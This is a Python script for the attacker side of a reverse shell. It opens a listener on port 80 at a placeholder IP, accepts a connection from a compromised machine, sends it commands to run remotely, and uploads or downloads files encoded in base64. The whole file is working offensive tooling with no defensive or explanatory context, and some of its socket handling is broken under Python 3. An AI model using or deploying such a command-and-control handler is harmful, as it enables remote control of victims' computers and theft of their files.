#!/usr/bin/env python3
import socket
import json
import base64

class Listener():
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print ("[*] Listening for incoming connection's")
        self.connection, self.address = listener.accept()
        print("[+] Connection Established at [ %s ]" % str(self.address))

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.json_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.json_recv()

    def download_file(self, path, content):
        with open(path, "wb") as file:
            decoded_file = base64.b64decode(content)
            file.write(decoded_file)
            return "Downloaded [%s] Successfully ." % path

    def upload_file(self, path):
        with open(path, "rb") as file:
            encoded_file = base64.b64encode(file.read())
            return encoded_file

    def run(self):
        while True:
            cmd = input("> ")
            cmd = cmd.split(" ")
            try:
                if cmd[0] == "upload":
                    file_content = self.upload_file(cmd[1])
                    cmd.append(file_content)
                result = self.execute_remotely(cmd)
                if cmd[0] == "download" and "[-] Error " not in result:
                    result = self.download_file(cmd[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print (result)


app = Listener("<YOUR IP>", 80)
app.run()
